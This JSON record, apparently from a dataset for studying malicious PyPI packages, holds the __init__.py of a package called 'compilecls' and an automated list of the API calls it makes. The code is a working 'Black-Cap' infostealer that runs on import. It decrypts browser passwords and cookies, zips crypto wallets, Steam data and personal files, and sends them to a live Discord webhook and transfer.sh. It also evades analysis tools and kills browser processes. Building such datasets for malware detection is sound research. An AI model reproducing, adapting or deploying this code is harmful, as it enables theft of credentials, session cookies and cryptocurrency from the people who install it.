[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/compilecls-1.0.2-py3-none-any/compilecls/__init__.py",
    "code_snippet": "import os\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport httpx\nimport psutil\nimport base64\nimport requests\nimport ctypes\nimport time\nimport pyperclip\nimport win32gui\nimport win32con\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\nlocal = os.getenv(\"LOCALAPPDATA\")\nroaming = os.getenv(\"APPDATA\")\ntemp = os.getenv(\"TEMP\")\nNotPSSW = []\n\n__config__ = {\n    \"yourwebhookurl\": \"https://discordapp.com/api/webhooks/1094671563900592279/_cSChOjEJs9TL7F1Kugq6WvyOKIKN1_qV3kRqXOeZ_F-OaXj7X7HFj86zihjv1RInLqJ\",\n    \"bc_injection_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js\",\n    \"hide\": \"yes\",\n    \"ping\": \"yes\",\n    \"pingtype\": \"everyone\",\n    \"fake_error\": \"no\",\n    \"startup\": \"no\",\n    \"kill_discord_process\": \"%kill_discord_process%\",\n    \"dbugkiller\": \"%_debugkiller%\",\n    \"addresse_crypto_replacer\": \"no\",\n    \"addresse_btc\": \"none\",\n    \"addresse_eth\": \"none\",\n    \"addresse_xchain\": \"none\",\n    \"addresse_pchain\": \"none\",\n    \"addresse_cchain\": \"none\",\n    \"addresse_monero\": \"none\",\n    \"addresse_ada\": \"none\",\n    \"addresse_dash\": \"none\",\n    \"blprggg\": [\n        \"httpdebuggerui\",\n        \"wireshark\",\n        \"fiddler\",\n        \"regedit\",\n        \"cmd\",\n        \"taskmgr\",\n        \"vboxservice\",\n        \"df5serv\",\n        \"processhacker\",\n        \"vboxtray\",\n        \"vmtoolsd\",\n        \"vmwaretray\",\n        \"ida64\",\n        \"ollydbg\",\n        \"pestudio\",\n        \"vmwareuser\",\n        \"vgauthservice\",\n        \"vmacthlp\",\n        \"x96dbg\",\n        \"vmsrvc\",\n        \"x32dbg\",\n        \"vmusrvc\",\n        \"prl_cc\",\n        \"prl_tools\",\n        \"xenservice\",\n        \"qemu-ga\",\n        \"joeboxcontrol\",\n        \"ksdumperclient\",\n        \"ksdumper\",\n        \"joeboxserver\",\n    ],\n}\n\nlogin_info = os.getlogin()\ncomputer_victim = os.getenv(\"COMPUTERNAME\")\nfast_memory_storage = str(psutil.virtual_memory()[0] / 1024**3).split(\".\")[0]\nstorage_space = str(psutil.disk_usage(\"/\")[0] / 1024**3).split(\".\")[0]\n\nbc_myregex_secret = \"https://paste.bingner.com/paste/u7qoj/raw\"\nreg_req = requests.get(bc_myregex_secret)\nregx_net = r\"[\\w-]{24}\\.\" + reg_req.text\n\n# ...\n# (Omitted: The full class definitions for Functions, auto_copy_wallet, first_function_bc, NoDebugg)\n# ...\n\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(first_function_bc().init())\nlocal = os.getenv(\"LOCALAPPDATA\")\nroaming = os.getenv(\"APPDATA\")\ntemp = os.getenv(\"TEMP\")\nThreadlist = []\n\ndef find_in_config(e: str) -> str or bool | None:\n    return __config__.get(e)\n\nhook = find_in_config(\"yourwebhookurl\")\n\nclass DATA_BLOB(Structure):\n    _fields_ = [(\"cbData\", wintypes.DWORD), (\"pbData\", POINTER(c_char))]\n\ndef GetData(blob_out):\n    cbData = int(blob_out.cbData)\n    pbData = blob_out.pbData\n    buffer = c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer, pbData, cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\n\ndef CryptUnprotectData(encrypted_bytes, entropy=b\"\"):\n    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))\n    buffer_entropy = c_buffer(entropy, len(entropy))\n    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)\n    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)\n    blob_out = DATA_BLOB()\n\n    if windll.crypt32.CryptUnprotectData(\n        byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)\n    ):\n        return GetData(blob_out)\n\ndef Value_Dcryptage(buff, master_key=None):\n    starts = buff.decode(encoding=\"utf8\", errors=\"ignore\")[:3]\n    if starts == \"v10\" or starts == \"v11\":\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\n\ndef Requests_loading(methode, url, data=\"\", files=\"\", headers=\"\"):\n    for i in range(8):\n        try:\n            if methode == \"POST\":\n                if data != \"\":\n                    r = requests.post(url, data=data)\n                    if r.status_code == 200:\n                        return r\n                elif files != \"\":\n                    r = requests.post(url, files=files)\n                    if (\n                        r.status_code == 200 or r.status_code == 413\n                    ):  # 413 = DATA TO BIG\n                        return r\n        except:\n            pass\n\ndef URL_librairy_Loading(hook, data=\"\", files=\"\", headers=\"\"):\n    for i in range(8):\n        try:\n            if headers != \"\":\n                r = urlopen(Request(hook, data=data, headers=headers))\n                return r\n            else:\n                r = urlopen(Request(hook, data=data))\n                return r\n        except:\n            pass\n\ndef Trust(Cookies):\n    global DETECTED\n    data = str(Cookies)\n    tim = re.findall(\".google.com\", data)\n    if len(tim) < -1:\n        DETECTED = True\n        return DETECTED\n    else:\n        DETECTED = False\n        return DETECTED\n\ndef Reformat(listt):\n    e = re.findall(\"(\\w+[a-z])\", listt)\n    while \"https\" in e:\n        e.remove(\"https\")\n    while \"com\" in e:\n        e.remove(\"com\")\n    while \"net\" in e:\n        e.remove(\"net\")\n    return list(set(e))\n\ndef upload(name, tk=\"\"):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\",\n    }\n\n    if name == \"check_spec_bc\":\n        data = {\n            \"content\": \"\",\n            \"embeds\": [\n                {\n                    \"fields\": [\n                        {\"name\": \"Interesting files found on user PC:\", \"value\": tk}\n                    ],\n                    \"author\": {\n                        \"name\": f\"Black - Cap v2.3\",\n                        \"url\": \"https://github.com/KSCHdsc\",\n                        \"icon_url\": \"https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif\",\n                    },\n                    \"footer\": {\"text\": \"github.com/KSCHdsc\"},\n                    \"color\": 374276,\n                }\n            ],\n            \"avatar_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png\",\n            \"attachments\": [],\n        }\n        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)\n        return\n    path = name\n    files = {\"file\": open(path, \"rb\")}\n\n    if \"bc_allpasswords\" in name:\n        ra = \" | \".join(da for da in paswWords)\n\n        if len(ra) > 1000:\n            rrr = Reformat(str(paswWords))\n            ra = \" | \".join(da for da in rrr)\n        data = {\n            \"content\": \"\",\n            \"embeds\": [\n                {\n                    \"fields\": [{\"name\": \"Passwords Found:\", \"value\": ra}],\n                    \"author\": {\n                        \"name\": f\"Black - Cap v2.3\",\n                        \"url\": \"https://github.com/KSCHdsc\",\n                        \"icon_url\": \"https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif\",\n                    },\n                    \"footer\": {\n                        \"text\": \"github.com/KSCHdsc\",\n                    },\n                    \"color\": 374276,\n                }\n            ],\n            \"avatar_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png\",\n            \"attachments\": [],\n        }\n        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)\n    if \"bc_allcookies\" in name:\n        rb = \" | \".join(da for da in cookiWords)\n        if len(rb) > 1000:\n            rrrrr = Reformat(str(cookiWords))\n            rb = \" | \".join(da for da in rrrrr)\n        data = {\n            \"content\": \"\",\n            \"embeds\": [\n                {\n                    \"fields\": [{\"name\": \"Cookies Found:\", \"value\": rb}],\n                    \"author\": {\n                        \"name\": f\"Black - Cap v2.3\",\n                        \"url\": \"https://github.com/KSCHdsc\",\n                        \"icon_url\": \"https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif\",\n                    },\n                    \"footer\": {\n                        \"text\": \"github.com/KSCHdsc\",\n                    },\n                    \"color\": 374276,\n                }\n            ],\n            \"avatar_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png\",\n            \"attachments\": [],\n        }\n        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)\n    Requests_loading(\"POST\", hook, files=files)\n\ndef writeforfile(data, name):\n    path = os.getenv(\"TEMP\") + f\"\\{name}.txt\"\n    with open(path, mode=\"w\", encoding=\"utf-8\") as f:\n        f.write(f\"Created by KSCH | https://github.com/KSCHdsc\\n\\n\")\n        for line in data:\n            if line[0] != \"\":\n                f.write(f\"{line}\\n\")\n\nNotPSSW = []\n\ndef Find_Passw(path, arg):\n    global NotPSSW\n    if not os.path.exists(path):\n        return\n    pathC = path + arg + \"/Login Data\"\n    if os.stat(pathC).st_size == 0:\n        return\n    tempfold = (\n        temp\n        + \"bc_is_here\"\n        + \"\".join(random.choice(\"bcdefghijklmnopqrstuvwxyz\") for i in range(8))\n        + \".db\"\n    )\n    shutil.copy2(pathC, tempfold)\n    conn = connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n\n    pathKey = path + \"/Local State\"\n    with open(pathKey, \"r\", encoding=\"utf-8\") as f:\n        local_state = loads(f.read())\n    master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n    master_key = CryptUnprotectData(master_key[5:])\n\n    for row in data:\n        if row[0] != \"\":\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split(\"[\")[1].split(\"]\")[0]\n                if wa in row[0]:\n                    if not old in paswWords:\n                        paswWords.append(old)\n            NotPSSW.append(\n                f\"URL: {row[0]} \\n ID: {row[1]} \\n PASSW0RD: {Value_Dcryptage(row[2], master_key)}\\n\\n\"\n            )\n    writeforfile(NotPSSW, \"bc_allpasswords\")\n\nCookies = []\n\ndef Get_Bc_Cook(path, arg):\n    global Cookies\n    if not os.path.exists(path):\n        return\n    pathC = path + arg + \"/Cookies\"\n    if os.stat(pathC).st_size == 0:\n        return\n    tempfold = (\n        temp\n        + \"bc_is_here\"\n        + \"\".join(random.choice(\"bcdefghijklmnopqrstuvwxyz\") for i in range(8))\n        + \".db\"\n    )\n\n    shutil.copy2(pathC, tempfold)\n    conn = connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n\n    pathKey = path + \"/Local State\"\n\n    with open(pathKey, \"r\", encoding=\"utf-8\") as f:\n        local_state = loads(f.read())\n    master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n    master_key = CryptUnprotectData(master_key[5:])\n\n    for row in data:\n        if row[0] != \"\":\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split(\"[\")[1].split(\"]\")[0]\n                if wa in row[0]:\n                    if not old in cookiWords:\n                        cookiWords.append(old)\n            Cookies.append(\n                f\"{row[0]}\\tTRUE\"\n                + \"\\t\\t\"\n                + f\"/FALSE\\t2597573456\\t{row[1]}\\t{Value_Dcryptage(row[2], master_key)}\"\n            )\n    writeforfile(Cookies, \"bc_allcookies\")\n\ndef checkIfProcessRunning(processName):\n    \"\"\"\n    Check if there is any running process that contains the given name processName.\n    \"\"\"\n    # Iterate over the all the running process\n    for proc in psutil.process_iter():\n        try:\n            # Check if process name contains the given name string.\n            if processName.lower() in proc.name().lower():\n                return True\n        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):\n            pass\n    return False\n\ndef ZipMyThings(path, arg, procc):\n    pathC = path\n    name = arg\n    if \"aholpfdialjgjfhomihkjbmgjidlcdno\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(\" \", \"\")\n        name = f\"Exodus_{browser}\"\n        pathC = path + arg\n    if \"nkbihfbeogaeaoehlefnkodbefgpgknn\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(\" \", \"\")\n        name = f\"Metamask_{browser}\"\n        pathC = path + arg\n    if not os.path.exists(pathC):\n        return\n    if checkIfProcessRunning(\"chrome.exe\"):\n        print(\"Yes a chrome process was running\")\n        subprocess.Popen(f\"taskkill /im {procc} /t /f\", shell=True)\n    else:\n        ...\n    if \"Wallet\" in arg or \"NationsGlory\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(\" \", \"\")\n        name = f\"{browser}\"\n    elif \"Steam\" in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"):\n            return\n        f = open(f\"{pathC}/loginusers.vdf\", \"r+\", encoding=\"utf8\")\n        data = f.readlines()\n        found = False\n        for l in data:\n            if 'RememberPassword\"\\t\\t\"1\"' in l:\n                found = True\n        if found == False:\n            return\n        name = arg\n    zf = zipfile.ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n    print(zf)\n    for file in os.listdir(pathC):\n        if not \".zip\" in file:\n            zf.write(pathC + \"/\" + file)\n    zf.close()\n\n    upload(f\"{pathC}/{name}.zip\")\n    os.remove(f\"{pathC}/{name}.zip\")\n\ndef bc_Gather_All():\n    \"Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >\"\n    browserPaths = [\n        [\n            f\"{roaming}/Opera Software/Opera GX Stable\",\n            \"opera.exe\",\n            \"/Local Storage/leveldb\",\n            \"/\",\n            \"/Network\",\n            \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{roaming}/Opera Software/Opera Stable\",\n            \"opera.exe\",\n            \"/Local Storage/leveldb\",\n            \"/\",\n            \"/Network\",\n            \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",\n            \"opera.exe\",\n            \"/Local Storage/leveldb\",\n            \"/\",\n            \"/Network\",\n            \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{local}/Google/Chrome/User Data\",\n            \"chrome.exe\",\n            \"/Default/Local Storage/leveldb\",\n            \"/Default\",\n            \"/Default/Network\",\n            \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{local}/Google/Chrome SxS/User Data\",\n            \"chrome.exe\",\n            \"/Default/Local Storage/leveldb\",\n            \"/Default\",\n            \"/Default/Network\",\n            \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{local}/BraveSoftware/Brave-Browser/User Data\",\n            \"brave.exe\",\n            \"/Default/Local Storage/leveldb\",\n            \"/Default\",\n            \"/Default/Network\",\n            \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{local}/Yandex/YandexBrowser/User Data\",\n            \"yandex.exe\",\n            \"/Default/Local Storage/leveldb\",\n            \"/Default\",\n            \"/Default/Network\",\n            \"/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{local}/Microsoft/Edge/User Data\",\n            \"edge.exe\",\n            \"/Default/Local Storage/leveldb\",\n            \"/Default\",\n            \"/Default/Network\",\n            \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n    ]\n\n    Paths_zipped = [\n        [f\"{roaming}/atomic/Local Storage/leveldb\", '\"Atomic Wallet.exe\"', \"Wallet\"],\n        [f\"{roaming}/Exodus/exodus.wallet\", \"Exodus.exe\", \"Wallet\"],\n        [\"C:\\Program Files (x86)\\Steam\\config\", \"steam.exe\", \"Steam\"],\n        [\n            f\"{roaming}/NationsGlory/Local Storage/leveldb\",\n            \"NationsGlory.exe\",\n            \"NationsGlory\",\n        ],\n    ]\n\n    for patt in browserPaths:\n        a = threading.Thread(target=Find_Passw, args=[patt[0], patt[3]])\n        a.start()\n        Threadlist.append(a)\n    thread_bccookies = []\n    for patt in browserPaths:\n        a = threading.Thread(target=Get_Bc_Cook, args=[patt[0], patt[4]])\n        a.start()\n        thread_bccookies.append(a)\n    for thread in thread_bccookies:\n        thread.join()\n    DETECTED = Trust(Cookies)\n    if DETECTED == True:\n        return\n    for patt in browserPaths:\n        threading.Thread(target=ZipMyThings, args=[patt[0], patt[5], patt[1]]).start()\n    for patt in Paths_zipped:\n        threading.Thread(target=ZipMyThings, args=[patt[0], patt[2], patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    global upths\n    upths = []\n\n    for file in [\"bc_allpasswords.txt\", \"bc_allcookies.txt\"]:\n        upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\n\ndef UploadTo_Anon(path):\n    try:\n        files = {\"file\": (path, open(path, mode=\"rb\"))}\n        ...\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\ndef CreateFolder_(pathF, keywords):\n    global bc_create_files\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file):\n            return\n        i += 1\n        if i <= maxfilesperdir:\n            url = UploadTo_Anon(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    bc_create_files.append([\"folder\", pathF + \"/\", ffound])\n\nbc_create_files = []\n\ndef bc_create_file(path, keywords):\n    global bc_create_files\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append(\n                        [path + \"/\" + file, UploadTo_Anon(path + \"/\" + file)]\n                    )\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    CreateFolder_(target, keywords)\n                    break\n    bc_create_files.append([\"folder\", path, fifound])\n\ndef check_spec_bc():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [user + \"/Desktop\", user + \"/Downloads\", user + \"/Documents\"]\n\n    key_wordsFiles = [\n        \"passw\",\n        \"mdp\",\n        \"motdepasse\",\n        \"mot_de_passe\",\n        \"login\",\n        \"secret\",\n        \"account\",\n        \"acount\",\n        \"paypal\",\n        \"banque\",\n        \"metamask\",\n        \"wallet\",\n        \"crypto\",\n        \"exodus\",\n        \"discord\",\n        \"2fa\",\n        \"code\",\n        \"memo\",\n        \"compte\",\n        \"token\",\n        \"backup\",\n        \"seecret\",\n    ]\n\n    wikith = []\n    for patt in path2search:\n        check_spec_bc = threading.Thread(\n            target=bc_create_file, args=[patt, key_wordsFiles]\n        )\n        check_spec_bc.start()\n        wikith.append(check_spec_bc)\n    return wikith\n\nglobal keyword, cookiWords, paswWords\n\nkeyword = [\n    \"mail\",\n    \"[coinbase](https://coinbase.com)\",\n    \"[sellix](https://sellix.io)\",\n    \"[gmail](https://gmail.com)\",\n    \"[steam](https://steam.com)\",\n    \"[discord](https://discord.com)\",\n    \"[riotgames](https://riotgames.com)\",\n    \"[youtube](https://youtube.com)\",\n    \"[instagram](https://instagram.com)\",\n    \"[tiktok](https://tiktok.com)\",\n    \"[twitter](https://twitter.com)\",\n    \"[facebook](https://facebook.com)\",\n    \"card\",\n    \"[epicgames](https://epicgames.com)\",\n    \"[spotify](https://spotify.com)\",\n    \"[yahoo](https://yahoo.com)\",\n    \"[roblox](https://roblox.com)\",\n    \"[twitch](https://twitch.com)\",\n    \"[minecraft](https://minecraft.net)\",\n    \"bank\",\n    \"[paypal](https://paypal.com)\",\n    \"[origin](https://origin.com)\",\n    \"[amazon](https://amazon.com)\",\n    \"[ebay](https://ebay.com)\",\n    \"[aliexpress](https://aliexpress.com)\",\n    \"[playstation](https://playstation.com)\",\n    \"[hbo](https://hbo.com)\",\n    \"[xbox](https://xbox.com)\",\n    \"buy\",\n    \"sell\",\n    \"[binance](https://binance.com)\",\n    \"[hotmail](https://hotmail.com)\",\n    \"[outlook](https://outlook.com)\",\n    \"[crunchyroll](https://crunchyroll.com)\",\n    \"[telegram](https://telegram.com)\",\n    \"[pornhub](https://pornhub.com)\",\n    \"[disney](https://disney.com)\",\n    \"[expressvpn](https://expressvpn.com)\",\n    \"crypto\",\n    \"[uber](https://uber.com)\",\n    \"[netflix](https://netflix.com)\",\n]\n\ncookiWords = []\npaswWords = []\n\nbc_Gather_All()\nDETECTED = Trust(Cookies)\n\nif not DETECTED:\n    wikith = check_spec_bc()\n\n    for thread in wikith:\n        thread.join()\n    time.sleep(0.2)\n\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext += f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a) - 1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n\n    upload(\"check_spec_bc\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n",
    "pattern_analysis": {
      "api_sequence": [
        "os.getenv",
        "os.getenv",
        "os.getenv",
        "os.getlogin",
        "os.getenv",
        "psutil.virtual_memory",
        "psutil.disk_usage",
        "requests.get",
        "re.findall",
        "os.name",
        "asyncio.run",
        "os.getenv",
        "os.getenv",
        "os.getenv",
        "os.getenv",
        "os.getenv",
        "os.getenv",
        "os.path.exists",
        "os.stat",
        "shutil.copy2",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "sqlite3.Cursor.fetchall",
        "sqlite3.Cursor.close",
        "sqlite3.Connection.close",
        "os.remove",
        "open",
        "json.loads",
        "base64.b64decode",
        "CryptUnprotectData",
        "AES.new",
        "Crypto.Cipher.AES.decrypt",
        "os.path.exists",
        "os.stat",
        "shutil.copy2",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "sqlite3.Cursor.fetchall",
        "sqlite3.Cursor.close",
        "sqlite3.Connection.close",
        "os.remove",
        "open",
        "json.loads",
        "base64.b64decode",
        "CryptUnprotectData",
        "os.listdir",
        "os.path.isfile",
        "open",
        "os.remove",
        "zipfile.ZipFile",
        "os.listdir",
        "zipfile.ZipFile.write",
        "zipfile.ZipFile.close",
        "upload",
        "os.remove",
        "psutil.process_iter",
        "psutil.Process.name",
        "requests.post",
        "requests.post",
        "requests.post",
        "requests.post",
        "urlopen",
        "Request",
        "urlopen",
        "Request",
        "threading.Thread",
        "threading.Thread.start",
        "threading.Thread",
        "threading.Thread.start",
        "threading.Thread.join",
        "threading.Thread",
        "threading.Thread.start",
        "threading.Thread",
        "threading.Thread.start",
        "threading.Thread.join",
        "os.getenv",
        "upload",
        "os.getenv",
        "upload",
        "os.listdir",
        "os.path.isfile",
        "open",
        "requests.post",
        "os.listdir",
        "os.path.isfile",
        "os.path.isdir",
        "UploadTo_Anon",
        "UploadTo_Anon",
        "threading.Thread",
        "threading.Thread.start",
        "threading.Thread.join",
        "time.sleep",
        "upload",
        "threading.Thread",
        "threading.Thread.start"
      ],
      "api_sequence_with_args": [
        "os.getenv(\"LOCALAPPDATA\")",
        "os.getenv(\"APPDATA\")",
        "os.getenv(\"TEMP\")",
        "os.getlogin()",
        "os.getenv(\"COMPUTERNAME\")",
        "psutil.virtual_memory()[0]",
        "psutil.disk_usage(\"/\")[0]",
        "requests.get(bc_myregex_secret)",
        "re.findall(\".google.com\", data)",
        "os.name",
        "asyncio.run(first_function_bc().init())",
        "os.getenv(\"LOCALAPPDATA\")",
        "os.getenv(\"APPDATA\")",
        "os.getenv(\"TEMP\")",
        "os.getenv(\"TEMP\")",
        "os.getenv(\"TEMP\")",
        "os.getenv(\"TEMP\")",
        "os.path.exists(path)",
        "os.stat(pathC).st_size",
        "shutil.copy2(pathC, tempfold)",
        "connect(tempfold)",
        "conn.cursor()",
        "cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")",
        "cursor.fetchall()",
        "cursor.close()",
        "conn.close()",
        "os.remove(tempfold)",
        "open(pathKey, \"r\", encoding=\"utf-8\")",
        "loads(f.read())",
        "b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])",
        "CryptUnprotectData(master_key[5:])",
        "AES.new(master_key, AES.MODE_GCM, iv)",
        "cipher.decrypt(payload)",
        "os.path.exists(path)",
        "os.stat(pathC).st_size",
        "shutil.copy2(pathC, tempfold)",
        "connect(tempfold)",
        "conn.cursor()",
        "cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")",
        "cursor.fetchall()",
        "cursor.close()",
        "conn.close()",
        "os.remove(tempfold)",
        "open(pathKey, \"r\", encoding=\"utf-8\")",
        "loads(f.read())",
        "b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])",
        "CryptUnprotectData(master_key[5:])",
        "os.listdir(pathC)",
        "os.path.isfile(f\"{pathC}/loginusers.vdf\")",
        "open(f\"{pathC}/loginusers.vdf\", \"r+\", encoding=\"utf8\")",
        "os.remove(f\"{pathC}/{name}.zip\")",
        "zipfile.ZipFile(f\"{pathC}/{name}.zip\", \"w\")",
        "os.listdir(pathC)",
        "zf.write(pathC + \"/\" + file)",
        "zf.close()",
        "upload(f\"{pathC}/{name}.zip\")",
        "os.remove(f\"{pathC}/{name}.zip\")",
        "psutil.process_iter()",
        "proc.name()",
        "requests.post(url, data=data)",
        "requests.post(url, files=files)",
        "requests.post(url, data=dumps(data).encode(), headers=headers)",
        "requests.post(url, files=files)",
        "urlopen(Request(hook, data=data, headers=headers))",
        "Request(hook, data=data, headers=headers)",
        "urlopen(Request(hook, data=data))",
        "Request(hook, data=data)",
        "threading.Thread(target=Find_Passw, args=[patt[0], patt[3]])",
        "a.start()",
        "threading.Thread(target=Get_Bc_Cook, args=[patt[0], patt[4]])",
        "a.start()",
        "thread.join()",
        "threading.Thread(target=ZipMyThings, args=[patt[0], patt[5], patt[1]])",
        "threading.Thread(target=ZipMyThings, args=[patt[0], patt[2], patt[1]])",
        "thread.join()",
        "os.getenv(\"TEMP\")",
        "upload(os.getenv(\"TEMP\") + \"\\\\\" + file)",
        "os.getenv(\"TEMP\")",
        "upload(os.getenv(\"TEMP\") + \"\\\\\" + file)",
        "os.listdir(pathF)",
        "os.path.isfile(pathF + \"/\" + file)",
        "open(pathF + \"/\" + file, mode=\"rb\")",
        "requests.post(\"https://transfer.sh/\", files=files)",
        "os.listdir(path)",
        "os.path.isfile(path + \"/\" + file)",
        "os.path.isdir(path + \"/\" + file)",
        "UploadTo_Anon(path + \"/\" + file)",
        "UploadTo_Anon(path + \"/\" + file)",
        "threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles])",
        "check_spec_bc.start()",
        "thread.join()",
        "time.sleep(0.2)",
        "upload(\"check_spec_bc\", filetext)",
        "threading.Thread(target=auto_copy_wallet().run)",
        "auto.start()"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getlogin",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "psutil.virtual_memory",
          "id": "get_virtual_memory",
          "description": "Retrieves system virtual memory statistics",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "hardware_information"
        },
        {
          "api_name": "psutil.disk_usage",
          "id": "get_disk_usage",
          "description": "Retrieves disk usage statistics (total, used, free) for given path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "system_resource_information"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "os.name",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "asyncio.run",
          "id": "run_async_function",
          "description": "Runs asynchronous function until completion",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.stat",
          "id": "path_object_operations",
